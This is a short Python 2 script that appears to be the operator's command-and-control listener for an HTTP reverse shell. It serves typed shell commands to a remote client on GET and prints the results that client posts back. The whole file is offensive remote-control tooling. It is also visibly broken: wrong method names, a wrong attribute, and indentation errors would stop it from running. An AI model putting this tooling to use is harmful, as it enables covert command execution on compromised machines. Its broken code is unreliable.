import BaseHTTPServer

HOST_NAME = '10.10.10.10'
PORT_NUMBER = 80

class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
  
   def do_GET(s):
        
        command = raw_input("Shell:- ")  
        s.send_response(200)                                  ## Sending Response
        s.send_header("Content-type","text/html")             ## Sending Header
        s.end_header()                                        ## Ending Header
        s.wfile.write(command)                                ## Writing the command
        
    def do_POST(s):                                           ## Sending through POST
        s.send_response(200)                                  ## Sending Response
        s.end_headers()                                       ## Ending Headers
        length = int(s.headers['Content-Length'])             ## Getting the Content length
        postVar = s.file.read(length)                          
        print postVar
        
if __name__=='__main__':

server_class = BaseHTTPServer.HTTPServer
httpd = server_class((HOST_NAME,PORT_NUMBER),MyHandler)

try:
    httpd.serve_forever() 
except KeyboardInterrupt:
    print '[!] Server is terminated'         ###  Server connection is terminated and will print if it is terminated .  
    httpd.server_close()
